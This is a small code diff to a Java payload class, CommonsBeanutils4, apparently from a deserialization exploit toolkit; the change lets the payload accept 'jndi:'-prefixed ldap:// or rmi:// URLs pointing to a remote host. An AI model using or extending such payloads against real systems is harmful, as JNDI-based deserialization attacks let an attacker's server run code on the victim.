@@ -24,6 +24,10 @@ public class CommonsBeanutils4 implements ObjectPayload<Object> {
 	@Override
 	public Object getObject(String command) throws Exception {
 
+		if (command.toLowerCase().startsWith("jndi:")) {
+			command = command.substring(5);
+		}
+
 		if (!command.toLowerCase().startsWith("ldap://") && !command.toLowerCase().startsWith("rmi://")) {
 			throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
 		}
